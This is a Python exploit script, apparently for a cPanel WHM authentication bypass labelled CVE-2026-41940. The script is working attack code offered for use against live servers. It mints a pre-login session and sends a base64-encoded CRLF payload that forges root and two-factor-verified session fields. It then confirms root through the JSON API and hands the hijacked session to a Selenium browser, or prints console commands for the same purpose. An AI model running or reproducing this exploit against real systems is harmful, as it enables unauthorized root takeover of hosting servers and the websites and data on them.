#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
cPanelCVE — CVE-2026-41940 WHM Root Auth Bypass (Auto Root Login)
Author  : mahanOF
Usage   : python3 cPanelCVE.py -u https://target:2087 --selenium [--engine chrome|firefox]
"""

import sys, re, json, ssl, argparse, time
from urllib.parse import urlsplit, quote, unquote, urlencode
from urllib.request import Request, build_opener, HTTPSHandler, HTTPErrorProcessor

# Colors
class C:
    RED = "\033[91m"; GREEN = "\033[92m"; YELLOW = "\033[93m"
    BLUE = "\033[94m"; CYAN = "\033[96m"; BOLD = "\033[1m"
    DIM = "\033[2m"; RESET = "\033[0m"

# Banner
def banner():
    print(f"""{C.RED}{C.BOLD}
   ██████╗██████╗  █████╗ ███╗  ██╗███████╗██╗
  ██╔════╝██╔══██╗██╔══██╗████╗ ██║██╔════╝██║
  ██║     ██████╔╝███████║██╔██╗██║█████╗  ██║
  ██║     ██╔═══╝ ██╔══██║██║╚████║██╔══╝  ██║
  ╚██████╗██║     ██║  ██║██║ ╚███║███████╗███████╗
   ╚═════╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚══╝╚══════╝╚══════╝{C.RESET}
{C.BOLD} ██████╗██╗   ██╗███████╗{C.RESET}
{C.BOLD}██╔════╝██║   ██║██╔════╝{C.RESET}
{C.BOLD}██║     ██║   ██║█████╗  {C.RESET}
{C.BOLD}██║     ╚██╗ ██╔╝██╔══╝  {C.RESET}
{C.BOLD}╚██████╗ ╚████╔╝ ███████╗{C.RESET}
{C.BOLD} ╚═════╝  ╚═══╝  ╚══════╝{C.RESET}
{C.RED}  cPanelCVE — CVE-2026-41940 WHM Root Auth Bypass (Auto Login){C.RESET}
{C.DIM}  4-stage: preauth → CRLF inject → propagate → verify → auto browser root{C.RESET}
{C.RED}  In-The-Wild | CVSS 10.0 | By mahanOF{C.RESET}
""")

# CRLF payload
PAYLOAD_B64 = (
    "cm9vdDp4DQpzdWNjZXNzZnVsX2ludGVybmFsX2F1dGhfd2l0aF90aW1lc3RhbXA9OTk5"
    "OTk5OTk5OQ0KdXNlcj1yb290DQp0ZmFfdmVyaWZpZWQ9MQ0KaGFzcm9vdD0x"
)

# SSL ignore
_CTX = ssl.create_default_context()
_CTX.check_hostname = False
_CTX.verify_mode = ssl.CERT_NONE
try: _CTX.set_ciphers("DEFAULT:@SECLEVEL=1")
except: pass

class NoRedirect(HTTPErrorProcessor):
    def http_response(self, req, resp): return resp
    https_response = http_response

_OPENER = build_opener(HTTPSHandler(context=_CTX), NoRedirect())
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/146.0.0.0 Safari/537.36"

def http_req(url, method="GET", headers=None, data=None, timeout=15, host_header=None):
    if headers is None: headers = {}
    headers.setdefault("User-Agent", UA)
    headers.setdefault("Connection", "close")
    if host_header: headers["Host"] = host_header

    body_bytes = None
    if data:
        if isinstance(data, dict):
            body_bytes = urlencode(data).encode()
            headers.setdefault("Content-Type", "application/x-www-form-urlencoded")
        elif isinstance(data, str): body_bytes = data.encode()

    req = Request(url, data=body_bytes, headers=headers, method=method)
    try:
        with _OPENER.open(req, timeout=timeout) as resp:
            rh = {}; raw_cookies = []
            for k, v in resp.headers.items():
                rh[k.lower()] = v
                if k.lower() == "set-cookie": raw_cookies.append(v)
            return resp.status, resp.read().decode("utf-8","replace"), rh, "\n".join(raw_cookies)
    except Exception as e:
        if hasattr(e,'read'):
            try: body = e.read().decode("utf-8","replace")
            except: body = str(e)
            rh = {k.lower():v for k,v in e.headers.items()} if hasattr(e,'headers') else {}
            raw_cookies = [v for k,v in e.headers.items() if k.lower()=="set-cookie"] if hasattr(e,'headers') else []
            return e.code if hasattr(e,'code') else 0, body, rh, "\n".join(raw_cookies)
        return 0, str(e), {}, ""

# Helpers
def parse_target(url):
    if "://" not in url: url = "https://" + url
    u = urlsplit(url.rstrip("/"))
    return u.scheme or "https", u.hostname, u.port or 2087

def build_url(scheme, host, port, path):
    if (scheme=="https" and port==443) or (scheme=="http" and port==80):
        return f"{scheme}://{host}{path}"
    return f"{scheme}://{host}:{port}{path}"

def discover_canonical(scheme, host, port, timeout):
    url = build_url(scheme, host, port, "/openid_connect/cpanelid")
    _, _, hdrs, _ = http_req(url, timeout=timeout)
    loc = hdrs.get("location","")
    m = re.match(r"^https?://([^:/]+)", loc)
    return m.group(1) if m else host

# Exploit
def run_exploit(target, timeout):
    scheme, host, port = parse_target(target)
    print(f"{C.CYAN}[*] Target: {scheme}://{host}:{port}{C.RESET}")
    canonical = discover_canonical(scheme, host, port, timeout)
    print(f"{C.BLUE}[0] Canonical: {canonical}{C.RESET}")
    host_hdr = f"{canonical}:{port}" if port not in (80,443) else canonical

    print(f"{C.YELLOW}[1] Minting preauth session...{C.RESET}")
    url1 = build_url(scheme, host, port, "/login/?login_only=1")
    _, _, hdrs, raw_cookies = http_req(url1, method="POST", data={"user":"root","pass":"wrong"},
                                       host_header=host_hdr, timeout=timeout)
    m = re.search(r'whostmgrsession=([^;,\s]+)', raw_cookies, re.IGNORECASE)
    if not m: print(f"{C.RED}[!] Stage1 failed{C.RESET}"); return None
    raw_cookie = m.group(1)
    session_base = unquote(raw_cookie)
    if "," in session_base: session_base = session_base.split(",",1)[0]
    print(f"{C.GREEN}[+] Session base: {session_base[:35]}...{C.RESET}")

    print(f"{C.YELLOW}[2] CRLF injection...{C.RESET}")
    cookie_enc = quote(session_base)
    url2 = build_url(scheme, host, port, "/")
    status, _, hdrs, _ = http_req(url2,
                                  headers={"Authorization": f"Basic {PAYLOAD_B64}",
                                           "Cookie": f"whostmgrsession={cookie_enc}"},
                                  host_header=host_hdr, timeout=timeout)
    loc = hdrs.get("location","")
    m = re.search(r"/cpsess(\d{10})", loc)
    if not m: print(f"{C.RED}[!] Stage2 failed (HTTP {status}){C.RESET}"); return None
    token = f"/cpsess{m.group(1)}"
    print(f"{C.GREEN}[+] Token: {token}{C.RESET}")

    print(f"{C.YELLOW}[3] Propagating...{C.RESET}")
    url3 = build_url(scheme, host, port, "/scripts2/listaccts")
    status, _, _, _ = http_req(url3,
                               headers={"Cookie": f"whostmgrsession={quote(session_base)}"},
                               host_header=host_hdr, timeout=timeout)
    if status == 401 or (200 <= status < 400):
        print(f"{C.GREEN}[+] Gadget fired{C.RESET}")
    else: print(f"{C.YELLOW}[!] Unexpected {status}, continuing{C.RESET}")

    print(f"{C.YELLOW}[4] Verifying root...{C.RESET}")
    url4 = build_url(scheme, host, port, f"{token}/json-api/version")
    status, body, _, _ = http_req(url4,
                                  headers={"Cookie": f"whostmgrsession={quote(session_base)}"},
                                  host_header=host_hdr, timeout=timeout)
    version = "unknown"
    if status == 200 and '"version"' in body:
        m_ver = re.search(r'"version"\s*:\s*"([^"]+)"', body)
        version = m_ver.group(1) if m_ver else "unknown"
        print(f"{C.GREEN}[+] ROOT ACCESS CONFIRMED — WHM {version}{C.RESET}")
    elif status in (500,503) and "License" in body:
        version = "license-gated"
        print(f"{C.YELLOW}[+] Access confirmed (license-gated){C.RESET}")
    else: print(f"{C.RED}[!] Verification failed{C.RESET}"); return None

    return {"scheme":scheme,"host":host,"port":port,"canonical":canonical,
            "session_base":session_base,"token":token,"version":version,"timeout":timeout}

# Selenium (fast Chrome / Firefox)
def selenium_browser_login(ctx, engine="chrome"):
    scheme, host, port = ctx["scheme"], ctx["host"], ctx["port"]
    session_base = ctx["session_base"]
    token = ctx["token"]
    target_base = f"{scheme}://{host}:{port}"
    full_url = f"{target_base}{token}/"
    js_session = quote(session_base)

    print(f"\n{C.YELLOW}[*] Launching {engine} with instant cookie injection...{C.RESET}")

    try:
        if engine == "firefox":
            from selenium import webdriver
            from selenium.webdriver.firefox.options import Options as FirefoxOptions
            opts = FirefoxOptions()
            opts.accept_insecure_certs = True
            driver = webdriver.Firefox(options=opts)
            driver.get(target_base)
            time.sleep(0.5)
            driver.add_cookie({"name": "whostmgrsession", "value": js_session, "path": "/"})
            driver.get(full_url)

        else:  # Chrome – optimized for speed
            from selenium import webdriver
            from selenium.webdriver.chrome.options import Options as ChromeOptions
            opts = ChromeOptions()
            # Standard SSL bypass
            opts.add_argument("--ignore-certificate-errors")
            opts.add_argument("--allow-insecure-localhost")
            # Speed optimizations
            opts.add_argument("--disable-extensions")
            opts.add_argument("--disable-gpu")
            opts.add_argument("--no-sandbox")
            opts.add_argument("--disable-dev-shm-usage")
            opts.add_argument("--disable-background-networking")
            opts.add_argument("--disable-sync")
            opts.add_argument("--no-first-run")
            opts.add_argument("--no-default-browser-check")
            opts.add_argument("--disable-component-update")
            opts.add_argument("--disable-features=TranslateUI,ChromeWhatsNewUI")
            opts.add_argument("--disable-prompt-on-repost")
            opts.add_experimental_option("excludeSwitches", ["enable-logging"])
            opts.add_experimental_option("detach", True)

            driver = webdriver.Chrome(options=opts)

            # Set cookie instantly via DevTools (no page load needed)
            driver.execute_cdp_cmd("Network.setCookie", {
                "name": "whostmgrsession",
                "value": js_session,
                "domain": host,
                "path": "/",
                "secure": False,
                "httpOnly": False,
            })

            print(f"{C.GREEN}[+] Opening WHM root session...{C.RESET}")
            driver.get(full_url)

        print(f"{C.GREEN}[*] Browser is now logged in as root.{C.RESET}")

    except Exception as e:
        print(f"{C.RED}[!] Could not launch {engine}.{C.RESET}")
        print(str(e))

# Manual fallback – corrected cookie set
def manual_fallback(ctx):
    js_session = quote(ctx["session_base"])
    target_base = f"https://{ctx['host']}:{ctx['port']}"
    full_url = f"{target_base}{ctx['token']}/"
    host_ip = ctx["host"]      # explicit domain for cookie

    # Build commands with domain and a delay before redirect
    cmd1 = f'document.cookie = "whostmgrsession={js_session};path=/;domain={host_ip}";'
    cmd2 = f'setTimeout(function(){{ location.href = "{full_url}"; }}, 500);'

    print(f"\n{C.YELLOW}Manual method (copy and paste in console):{C.RESET}")
    print(f"1. Open {C.CYAN}{target_base}{C.RESET} and accept the SSL warning.")
    print(f"2. Press F12 → Console tab.")
    print(f"3. Paste these two lines EXACTLY, one by one, pressing Enter after each:")
    print(f"{C.GREEN}{cmd1}{C.RESET}")
    print(f"{C.GREEN}{cmd2}{C.RESET}")
    print(f"{C.YELLOW}It will redirect you to the root WHM dashboard after 0.5s.{C.RESET}")

# Main
def main():
    banner()
    parser = argparse.ArgumentParser(description="cPanelCVE — CVE-2026-41940 Auto Root Login")
    parser.add_argument("-u","--url", required=True, help="Target (https://host:2087)")
    parser.add_argument("--selenium", action="store_true", help="Auto login via Selenium (Chrome/Firefox)")
    parser.add_argument("--engine", choices=["chrome","firefox"], default="chrome")
    parser.add_argument("--browser", action="store_true", help="Fallback: manual console commands")
    parser.add_argument("--timeout", type=int, default=15)
    parser.add_argument("--no-color", action="store_true")
    args = parser.parse_args()

    if args.no_color:
        for attr in dir(C):
            if not attr.startswith("_"): setattr(C, attr, "")

    result = run_exploit(args.url, args.timeout)
    if not result: sys.exit(1)

    if args.selenium:
        selenium_browser_login(result, args.engine)
    elif args.browser:
        manual_fallback(result)
    else:
        print(f"\n{C.CYAN}Root session ready. Use --selenium or --browser.{C.RESET}")
        print(f"Token: {C.GREEN}{result['token']}{C.RESET}  |  Host: {result['host']}:{result['port']}")

if __name__ == "__main__":
    main()
